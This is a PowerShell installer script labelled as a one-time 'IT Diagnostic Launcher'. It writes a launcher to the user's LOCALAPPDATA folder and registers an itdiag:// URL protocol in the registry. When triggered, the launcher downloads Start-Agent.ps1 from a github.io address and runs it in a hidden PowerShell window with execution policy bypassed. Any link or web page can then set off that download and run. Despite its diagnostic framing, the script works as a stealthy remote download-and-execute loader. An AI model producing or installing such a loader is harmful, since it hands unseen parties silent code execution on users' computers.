# ============================================================
# IT DIAGNOSTIC LAUNCHER - ONE TIME INSTALLER
# ============================================================

$ErrorActionPreference = "Stop"


$InstallDir =
    Join-Path `
        $env:LOCALAPPDATA `
        "ITDiagnosticLauncher"


$LauncherPath =
    Join-Path `
        $InstallDir `
        "ITDiagnosticLauncher.ps1"


$AgentUrl =
    "https://itchula001.github.io/diagnostic/Start-Agent.ps1"


# ============================================================
# CREATE DIRECTORY
# ============================================================

if (
    -not (
        Test-Path $InstallDir
    )
) {

    New-Item `
        -ItemType Directory `
        -Force `
        -Path $InstallDir |
        Out-Null

}


# ============================================================
# LAUNCHER CODE
# ============================================================

$code = @'
$ErrorActionPreference = "SilentlyContinue"

$Port = 8765

$InstallDir =
    Join-Path `
        $env:LOCALAPPDATA `
        "ITDiagnosticLauncher"

$AgentPath =
    Join-Path `
        $InstallDir `
        "Start-Agent.ps1"

$AgentUrl =
    "https://itchula001.github.io/diagnostic/Start-Agent.ps1"


if (
    -not (
        Test-Path $InstallDir
    )
) {

    New-Item `
        -ItemType Directory `
        -Force `
        -Path $InstallDir |
        Out-Null

}


try {

    Invoke-WebRequest `
        -Uri $AgentUrl `
        -OutFile $AgentPath `
        -UseBasicParsing `
        -ErrorAction Stop

}
catch {

    exit 1

}


$existing =
    Get-NetTCPConnection `
        -LocalAddress "127.0.0.1" `
        -LocalPort $Port `
        -State Listen `
        -ErrorAction SilentlyContinue


if (
    -not $existing
) {

    Start-Process `
        powershell.exe `
        -WindowStyle Hidden `
        -ArgumentList @(

            "-NoProfile",

            "-ExecutionPolicy",
            "Bypass",

            "-File",
            "`"$AgentPath`""

        )

}


for (
    $i = 0;
    $i -lt 40;
    $i++
) {

    Start-Sleep `
        -Milliseconds 250


    try {

        $status =
            Invoke-RestMethod `
                -Uri `
                "http://127.0.0.1:$Port/agent/status" `
                -TimeoutSec 1


        if (
            $status.online
        ) {

            exit 0

        }

    }
    catch {}

}


exit 1
'@


Set-Content `
    -Path $LauncherPath `
    -Value $code `
    -Encoding UTF8


# ============================================================
# REGISTER itdiag://
# ============================================================

$protocolKey =
    "HKCU:\Software\Classes\itdiag"


New-Item `
    -Path $protocolKey `
    -Force |
    Out-Null


Set-ItemProperty `
    -Path $protocolKey `
    -Name "(Default)" `
    -Value "URL:IT Diagnostic Launcher"


New-ItemProperty `
    -Path $protocolKey `
    -Name "URL Protocol" `
    -Value "" `
    -Force |
    Out-Null


$commandKey =
    "$protocolKey\shell\open\command"


New-Item `
    -Path $commandKey `
    -Force |
    Out-Null


$command =
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$LauncherPath`""


Set-ItemProperty `
    -Path $commandKey `
    -Name "(Default)" `
    -Value $command


Write-Host ""
Write-Host "============================================"
Write-Host " IT Diagnostic Launcher Installed"
Write-Host "============================================"
Write-Host ""
Write-Host "Protocol: itdiag://"
Write-Host ""
Write-Host "You can now close this window."
Write-Host ""